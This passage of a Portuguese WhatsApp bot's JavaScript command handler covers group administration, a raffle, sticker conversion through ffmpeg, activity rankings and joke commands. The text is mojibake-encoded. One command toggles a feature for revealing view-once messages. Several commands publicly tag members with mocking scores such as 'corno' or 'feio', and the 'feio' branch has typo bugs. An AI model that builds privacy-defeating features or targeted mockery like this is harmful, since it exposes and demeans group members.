‚îÇ‚û± ùóîùóªùòÅùó∂ùó∞ùóÆùòÅùóÆùóπùóºùó¥ùóº: ${isAnticatalogo ? '‚úÖ' : '‚õî'}
‚îÇ‚û¨ ùó´ùüµùòÉùó∂ùòÄùòÇùòÇùóªùó∂ùó∞ùóÆ: ${isX9VisuUnica ? '‚úÖ' : '‚õî'}
‚îÇ‚û± ùóîùóªùòÅùó∂ùòÉùó∂ùó±ùó≤ùóº: ${isAntiVideo ? '‚úÖ' : '‚õî'}
‚îÇ‚û± ùóîùóªùòÅùó∂ùóπùóºùó∞: ${isAntiloc ? '‚úÖ' : '‚õî'}
‚îÇ‚û¨ùóîùóªùòÅùó∂ùó∞ùòÅùòÅ: ${isAntiCtt ? '‚úÖ' : '‚õî'}
‚îÇ‚û¨ ùóîùóªùòÅùó∂ùóπùó∂ùóªùó∏: ${isAntiLink ? '‚úÖ' : '‚õî'}
‚îÇ‚û± ùóîùóªùòÅùó∂ùóπùó∂ùóªùó∏ùó¥ùóΩ: ${isAntilinkgp ? '‚úÖ' : '‚õî'}
‚îÇ‚û± ùóîùòÇùòÅùóº-ùó±ùóºùòÑùóª: ${isAutoDown ? '‚úÖ' : '‚õî'}
‚ï∞‚ï∏‚ï∏‚ï∏‚ù≤ ${botName} ‚ù≥‚ï∏‚ï∏‚ï∏‚ïØ`)
break



case "grupo":
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
try {
if (q == "a") {
await amy.groupSettingUpdate(from, "not_announcement")
reply("„ÄéGrupo aberto com sucesso„Äè‚úÖ")
}
if (q == "f") {
await amy.groupSettingUpdate(from, "announcement")
reply("„ÄéGrupo fechado com sucesso„Äè ‚úÖ")
}
} catch(e) {
console.log(e)
reply(resposta.erro)
}
break



case 'sorteio':
try{
if(!isGroup) return reply(msg.grupo)
if(!q) return reply(`Coloque algo apos o comando`)
d = []
teks = `üéâ SORTEIO üéâ
PARAB√âNS VOCE ACABOU DE GANHAR üéâ\nPREMIO: ${q}\nGANHADOR: `
for(i = 0; i < 1; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `@${groupMembers[r].id.split('@')[0]}`
d.push(groupMembers[r].id)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Deu erro :/')
}
break

case 'x9visuunica':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
if(args.length < 1) return reply(' 1 ùô•ùôßùôñ ùô°ùôûùôúùôñùôß / 0 ùô•ùôßùôñ ùôôùôöùô®ùô°ùôûùôúùôñùôß')
if(Number(args[0]) === 1) {
if(isX9VisuUnica) return reply('ùôä ùôßùôöùôòùô™ùôßùô®ùô§ ùôôùôö ùôßùôöùô´ùôöùô°ùôñùôß ùô´ùôûùô®ùô™ ùô™ÃÅùô£ùôûùôòùôñ ùôüùôñÃÅ ùôöùô®ùô©ùôñÃÅ ùôñùô©ùôûùô´ùôñùôôùô§ üë©üèª‚Äçüíª')
dataGp[0].visuUnica = true
setGp(dataGp)
setTimeout(() => {reagir(from, `‚úÖ`)}, 50)
reply('ùóîùòÅùó∂ùòÉùóºùòÇ ùó∞ùóºùó∫ ùòÄùòÇùó∞ùó≤ùòÄùòÄùóº ùóº ùóøùó≤ùó∞ùòÇùóøùòÄùóº ùó±ùó≤ ùóøùó≤ùòÉùó≤ùóπùóÆùóø ùòÉùó∂ùòÄùòÇ ùòÇÃÅùóªùó∂ùó∞ùóÆ ùóªùó≤ùòÄùòÅùó≤ ùó¥ùóøùòÇùóΩùóº ‚úÖ')
} else if(Number(args[0]) === 0) {
if(!isX9VisuUnica) return reply(' ùôä ùôßùôöùôòùô™ùôßùô®ùô§ ùôôùôö ùôßùôöùô´ùôöùô°ùôñùôß ùô´ùôûùô®ùô™ ùô™ÃÅùô£ùôûùôòùôñ ùôüùôñÃÅ ùôöùô®ùô©ùôñÃÅ ùôôùôöùô®ùôñùô©ùôûùô´ùôñùôôùô§ üë©üèª‚Äçüíª ')
dataGp[0].visuUnica = false
setGp(dataGp)
setTimeout(() => {reagir(from, `‚ùå`)}, 50)
reply('ùòøùôöùô®ùôñùô©ùôûùô´ùô§ùô™ ùôòùô§ùô¢ ùô®ùô™ùôòùôöùô®ùô®ùô§ ùô§ ùôßùôöùôòùô™ùôßùô®ùô§ ùôôùôö ùôßùôöùô´ùôöùô°ùôñùôß ùô´ùôûùô®ùô™ ùô™ÃÅùô£ùôûùôòùôñ ùô£ùôöùô®ùô©ùôö ùôúùôßùô™ùô•ùô§ ‚úÖ')
} else {
reply('ùü≠ ùô•ùôñùôßùôñ ùôñùô©ùôûùô´ùôñùôß, ùü¨ ùô•ùôñùôßùôñ ùôôùôöùô®ùôñùô©ùôûùô´ùôñùôß')
}
break


case 'modogame':  
case 'modogamer':  
case 'Modogame':
if (!isGroup) return reply(msg.grupo)
if (!isAdmins) return reply(msg.adm)
if (args.length < 1) return reply('1 pra ativar / 0 pra desativar')
if (Number(args[0]) === 1) {
if (isModobn) return reply('Ja esta ativo no grupo')
modobn.push(from)
fs.writeFileSync('./arquivos/grupos/brincadeiras.json', JSON.stringify(modobn))
reply(`\`\`\`‚úì Ativou com sucesso o modogame no grupo`)
} else if (Number(args[0]) === 0) {
if (!isModobn) return reply('Ja esta desativado')  
modobn.splice(from, 1)
fs.writeFileSync('./arquivos/grupos/brincadeiras.json', JSON.stringify(modobn))
reply(`\`\`\`‚úì Desativou com sucesso no grupo`)
} else {
reply('1 pra ativar / 0 pra desativar')
}
break 


break

case 'resetarlink':
if (!isGroup) return reply('Somente em grupos')
if (!isBotAdmins) return reply(`Preciso ser adm`)
if (!isAdmins) return reply('Somente adms')
try {
await amy.groupRevokeInvite(from)
reply("ùôáùôÑùôâùôÜ ùòøùôä ùôÇùôçùôêùôãùôä ùôçùôÄùôéùôÄùôèùòºùòøùôä ùòæùôäùôà ùôéùôêùòæùôÄùôéùôéùôä ‚úÖ")
} catch(e) {
console.log(e)
reply(resposta.erro)
}
break





//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏ùôÅùôÑùôà ùòæùôàùòø ùòºùòøùôà‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏

//FIGURINHAS 
case 'toimg':
if (!isQuotedSticker) return reply('ùôàùôñùôßùôòùôñ ùô™ùô¢ùôñ ùôÅùôûùôúùô™ùôßùôûùô£ùôùùôñ!!')
buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
try {
amy.sendMessage(from, {image: buff}, {quoted: info})
} catch(e) {
console.log(e)
reply('erro...')
}
break



case 'togif2':
if (!isQuotedSticker) return reply('ùó†ùóÆùóøùóæùòÇùó≤ ùóÆ ùó≥ùó∂ùó¥ùòÇùóøùó∂ùóªùóµùóÆ ùóÆùóªùó∂ùó∫ùóÆùó±ùóÆ !')
if (info.message?.extendedTextMessage?.contextInfo?.quotedMessage?.stickerMessage && info.message?.extendedTextMessage?.contextInfo?.quotedMessage?.stickerMessage?.isAnimated) {
let media = await downloadAndSaveMediaMessage(info.message?.extendedTextMessage?.contextInfo?.quotedMessage?.stickerMessage)
try {
reply('ùóîùó¥ùòÇùóÆùóøùó±ùó≤, ùó∞ùóºùóªùòÉùó≤ùóøùòÅùó≤ùóªùó±ùóº ùóÆ ùó≥ùó∂ùó¥ùòÇùóøùó∂ùóªùóµùóÆ ùó≤ùó∫ ùó¥ùó∂ùó≥...')
a = await webp_mp42(media)
mp4 = await getBuffer(a.result)
amy.sendMessage(from, { video: mp4, gifPlayback: true, filename: `stick.gif` }, { quoted: info })
} catch {
reply('ùóòùóøùóøùóº ùóÆùóº ùó∞ùóºùóªùòÉùó≤ùóøùòÅùó≤ùóø ùóΩùóÆùóøùóÆ ùó¥ùó∂ùó≥')
}
await fs.unlinkSync(media)
} else {
reply('ùó†ùóÆùóøùóæùòÇùó≤ ùóÆ ùó≥ùó∂ùó¥ùòÇùóøùó∂ùóªùóµùóÆ ùóÆùóªùó∂ùó∫ùóÆùó±ùóÆ!')
}
break


case 'figurinha':
case 'f':
case 'fig':
case 's':
{
(async function () {
var legenda = q ? q?.split("/")[0] : `${pushname}`
if (isMedia && !info.message.videoMessage || isQuotedImage) {
var encmedia = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'image')
fs.writeFileSync(rane, buffimg)
rano = getRandom('.webp')
exec(`ffmpeg -i ${rane} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(rane)
// "android-app-store-link": "https://play.google.com/store/search?q=%2B55%2094%209147-2796%20%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5&c=apps",
var json = {
"sticker-pack-name": legenda
}
var exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
var jsonBuff = Buffer.from(JSON.stringify(json), "utf-8")
var exif = Buffer.concat([exifAttr, jsonBuff])
exif.writeUIntLE(jsonBuff.length, 14, 4)
let nomemeta = Math.floor(Math.random() * (99999 - 11111 + 1) + 11111)+".temp.exif"
fs.writeFileSync(`./${nomemeta}`, exif) 
exec(`webpmux -set exif ${nomemeta} ${rano} -o ${rano}`, () => {
amy.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: info})
DLT_FL(encmedia)
fs.unlinkSync(nomemeta)
fs.unlinkSync(rano)
})
})
} else if (isMedia && info.message.videoMessage.seconds < 11 || isQuotedVideo && info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 35) {
var encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
rano = getRandom('.webp')
await ffmpeg(`./${rane}`)
.inputFormat(rane.split('.')[1])
exec(`ffmpeg -i ${rane} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(rane)
let json = {
"sticker-pack-name": legenda
}
let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
let jsonBuff = Buffer.from(JSON.stringify(json), "utf-8")
let exif = Buffer.concat([exifAttr, jsonBuff])
exif.writeUIntLE(jsonBuff.length, 14, 4)
let nomemeta = "temp.exif"
fs.writeFileSync(`./${nomemeta}`, exif) 
exec(`webpmux -set exif ${nomemeta} ${rano} -o ${rano}`, () => {
amy.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: info})
DLT_FL(encmedia)
fs.unlinkSync(nomemeta)
fs.unlinkSync(rano)
})
})
} else {
reply(`Voc√™ precisa reply ou marcar uma imagem ou v√≠deo com no m√°ximo 10 segundos`)
}
})().catch(e => {
console.log(e)
reply("Hmm deu erro")
try {
if (fs.existsSync("temp.exif")) fs.unlinkSync("temp.exif");
if (fs.existsSync(rano)) fs.unlinkSync(rano);
if (fs.existsSync(media)) fs.unlinkSync(media);
} catch {}
})
}
break
//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏ ùôàùôÄùôâùôê ùôÖùôäùôÇùôäùôé ‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏

case 'rankativos': 
case 'rankativo':   
reagir(from, "üèÖ") 
if(!isGroup) return reply(reply.msg.grupo)
var i3 = countMessage.map(i => i.groupId).indexOf(from)
var blue = countMessage[i3].numbers.map(i => i)
blue.sort((a, b) => ((a.figus == undefined ? a.figus = 0 : a.figus + a.messages + a.cmd_messages) < (b.figus == undefined ? b.figus = 0 : b.figus + b.cmd_messages + b.messages)) ? 0 : -1)
menc = [] 
blad = `*üèÜ Rank dos mais ativos no grupo:* ${groupName}\n`
for ( i = 0; i < (blue.length < 5 ? blue.length : 5); i++) {
if (i != null) blad += `\n*üèÖ ${i + 1}¬∫ Lugar:* @${blue[i].id.split('@')[0]}\n‚Ä¢ ùó†ùó≤ùóªùòÄùóÆùó¥ùó≤ùóªùòÄ: *${blue[i].messages}*\n‚Ä¢ ùóñùóºùó∫ùóÆùóªùó±ùóºùòÄ ùó±ùóÆùó±ùóºùòÄ: *${blue[i].cmd_messages}*\n‚Ä¢ ùóôùó∂ùó¥ùòÇùóøùó∂ùóªùóµùóÆùòÄ ùó≤ùóªùòÉùó∂ùóÆùó±ùóÆùòÄ: *${blue[i].figus}*\n`
menc.push(blue[i].id)
}
amy.sendMessage(from, { image: { url: 'https://telegra.ph/file/3983278541166715dced3.jpg' }, caption: blad}, {quoted: info})
break


//‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏ùòºùôëùòºùôáùôÑùòºùôç‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏‚ï∏

case 'corno': case 'corna':
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)   
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}
   
if(!budy.includes("@")) {
var blamention_id = sender 
}
amy.sendMessage(from, {text:` ‚ù∞ Pesquisando a sua ficha de corno(a) : @${blamention_id.split("@")[0]} aguarde... ‚ù±`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${cornin}`)
random = `${Math.floor(Math.random() * 150)}`
await amy.sendMessage(from, {image: wew, caption: `‚Ä¢ O quanto voce e corno(a) üêÇ\n\n‚ßº @${blamention_id.split("@")[0]} ‚ßΩ voce eÃÅ: ‚ù∞ ${random}% ‚ù± corno üêÉ\n‚Ä¢ Que isso üôà`, gifPlayback: true, mentions: [blamention_id]}, {quoted: info})
}, 5000)
break 
case 'gado':
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
if(!isGroup) return reply('ùôéùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôöùô®ùô©ùôö ùôòùô§ùô¢ùôñùô£ùôôùô§, ùôöùô¢ ùôúùôßùô™ùô•ùô§.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender   
}
amy.sendMessage(from, {text:`‚ù∞ ùôãùôöùô®ùô¶ùô™ùôûùô®ùôñùô£ùôôùô§ ùôñ ùôõùôûùôòùôùùôñ ùôôùôö ùôúùôñùôôùô§ : @${blamention_id.split("@")[0]}, ùôñùôúùô™ùôñùôßùôôùôö... ‚ù±`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${gadin}`)
random = `${Math.floor(Math.random() * 110)}`
await amy.sendMessage(from, {image: wew, caption: `ùôä ùô¶ùô™ùôñùô£ùô©ùô§ ùô´ùô§ùôòùôöÃÇ ùôöÃÅ ùôúùôñùôôùô§? \n\n„Äå @${blamention_id.split("@")[0]} „Äçùôëùô§ùôòùôöÃÇ ùôöÃÅ: ‚ù∞ ${random}% ‚ù±  ùôúùôñùôôùô§(ùôñ) üêÇ`, mentions: [blamention_id]}, {quoted: info})
}, 5000)
break 

case 'bonita':
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)   
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
amy.sendMessage(from, {text:` ‚ù∞ Pesquisando a sua ficha de bonita : @${blamention_id.split("@")[0]} aguarde... ‚ù±`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${bonita}`)
random = `${Math.floor(Math.random() * 150)}`
await amy.sendMessage(from, {image: wew, caption: `‚Ä¢ O quanto voce e bonita üíñ\n\n‚ßº @${blamention_id.split("@")[0]} ‚ßΩ voce eÃÅ: ‚ù∞ ${random}% ‚ù± bonita üòç\n‚Ä¢ Que isso ta linda üôà`, gifPlayback: true, mentions: [blamention_id]}, {quoted: info})
}, 5000)
break 

case 'gada':
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)   
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
amy.sendMessage(from, {text:` ‚ù∞ Pesquisando a sua ficha de gada : @${blamention_id.split("@")[0]} aguarde... ‚ù±`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${gada}`)
random = `${Math.floor(Math.random() * 150)}`
await amy.sendMessage(from, {image: wew, caption: `‚Ä¢ O quanto voce e gada üêÑ\n\n‚ßº @${blamention_id.split("@")[0]} ‚ßΩ voce eÃÅ: ‚ù∞ ${random}% ‚ù± gada üêÑ\n‚Ä¢ Que isso ksks üôà`, gifPlayback: true, mentions: [blamention_id]}, {quoted: info})
}, 5000)
break 

case 'bebado':
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)   
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
amy.sendMessage(from, {text:`‚ù∞ Pesquisando a ficha de bebado : @${blamention_id.split("@")[0]} , aguarde... ‚ù±`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${bebin}`)
random = `${Math.floor(Math.random() * 110)}`
await amy.sendMessage(from, {image: wew, caption:`O quanto voc√™ √© bebado? \n\n„Äå @${blamention_id.split("@")[0]} „ÄçVoc√™ √©: ‚ù∞ ${random}% ‚ù± B√™bado ü§¢ü•µü•¥`, mentions: [blamention_id]}, {quoted: info})
}, 7000)
break

case 'vesgo':
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}
amy.sendMessage(from, {text:`‚ù∞ Pesquisando a ficha de vesgo : @${blamention_id.split("@")[0]}, aguarde... ‚ù±`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${vesgin}`)
random = `${Math.floor(Math.random() * 110)}`
await amy.sendMessage(from, {image: wew, caption: `O quanto voc√™ √© vesgo? \n\n„Äå @${blamention_id.split("@")[0]} „ÄçVoc√™ √©: ‚ù∞ ${random}% ‚ù±  Vesgo üôÑüòÜ`, mentions: [blamention_id]}, {quoted: info})
}, 5000)
break 


case 'feio':
if(!isModobn) return reply(`ùôäùô°ùôñ ${pushname} ùôÄùô®ùô©ùôö ùô©ùôûùô•ùô§ ùôôùôö ùôòùô§ùô¢ùôñùô£ùôôùô§ ùô®ùô§ÃÅ ùô•ùô§ùôôùôö ùô®ùôöùôß ùô™ùô©ùôûùô°ùôûùôØùôñùôôùô§ ùôòùô§ùô¢ ùô§ ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ ùôñùô©ùôûùô´ùô§, ùôõùôñùô°ùôö ùôòùô§ùô¢ ùô™ùô¢ ùôñùôôùô¢ ùô§ùô™ ùô®ùôö ùô´ùô§ùôòùôöÃÇ ùôõùô§ùôß, ùôñùô•ùôöùô£ùôñùô® ùôôùôûùôúùôûùô©ùôö ${prefix}ùô¢ùô§ùôôùô§ùôóùôßùôûùô£ùôòùôñùôôùôöùôûùôßùôñ 1 üë©üèª‚Äçüíª`)  
if(!isGroup) return reply('S√≥ pode ser utilizado este comando, em grupo.')
if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}

amy.sendMessage(from, {text: `Pesquisando a sua ficha de feio : @${blamention_id.split("@")[0]} aguarde...`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${fein}`)
random = `${Math.floor(Math.random() * 110)}`
feio = random
if (feio < 20 ) {var bo = '√â n√£o √© feio'} else if (feio == 21 ) {var bo = '+/- feio'} else if (feio == 23 ) {var bo = '+/- feio'} else if (feio == 24 ) {var bo = '+/- feio'} else if (feio == 25 ) {var bo = '+/- feio'} else if (feio == 26 ) {var bo = '+/- feio'} else if (feio == 27 ) {var bo = '+/- feio'} else if (feio == 2 ) {var bo = '+/- feio'} else if (feio == 29 ) {var bo = '+/- feio'} else if (feio == 30 ) {var bo = '+/- feio'} else if (feio == 31 ) {var bo = 'Ainda t√° na m√©dia'} else if (feio == 32 ) {var bo = 'Da pra pegar umas(ns) novinha(o) ainda'} else if (feio == 33 ) {var bo = 'Da pra pegar umas(ns) novinha(o) ainda'} else if (feio == 34 ) {var bo = '√â fein, mas tem baum cora√ß√£o'} else if (feio == 35 ) {var bo = 'T√° na m√©dia, mas n√£o deixa de ser feii'} else if (feio == 36 ) {var bo = 'Bonitin mas √© feio com orgulho'} else if (feio == 37 ) {var bo = 'Feio e pregui√ßoso(a), vai se arrumar praga feia'} else if (feio == 3 ) {var bo = 'tenho '} else if (feio == 39 ) {var bo = 'Feio, mas um banho E se arrumar, deve resolver'} else if (feio == 40 ) {var bo = 'FeiN,  mas n√£o existe gente feia, existe gente que n√£o conhece os produtos jequity'} else if (feio == 41 ) {var bo = 'voc√™ √© Feio, mas √© legal, continue assim'} else if (feio == 42 ) {var bo = 'Nada que uma maquiagem e se arrumar, que n√£o resolva ü•¥'} else if (feio == 43 ) {var bo = 'Feio que d√≥i de ver, compra uma m√°scara que melhora'} else if (feio == 44 ) {var bo = 'Feio mas nada que um saco na cabe√ßa n√£o resolva n√©!?'} else if (feio == 45 ) {var bo = 'voc√™ √© feio, mas tem bom gosto'} else if (feio == 46 ) {var bo = 'Feio mas tem muitos amigos'} else if (feio == 47 ) {var bo = 'Feio mas tem l√°bia pra pegar v√°rias novinha'} else if (feio == 4 ) {var bo = 'Feio e ainda n√£o sabe se vestir, vixi'} else if (feio == 49 ) {var bo = 'Feiooo'} else if (feio == 50 ) {var bo = 'voc√™ √© Feio, mas n√£o se encherga üßê'} else if (feio > 51) {var bo = 'voc√™ √© Feio demais üôà'} 

await amy.sendMessage(from, {image: wew, caption: `  O quanto voc√™ √© feio? \n\n „Äå @${blamention_id.split("@")[0]} „ÄçVoc√™ √©: ‚ù∞ ${random}% ‚ù± feio üôâ\n\n${bo}`, mentions: [blamention_id], thumbnail:null}, {quoted: info})
}, 5000)
break


case 'gostoso':
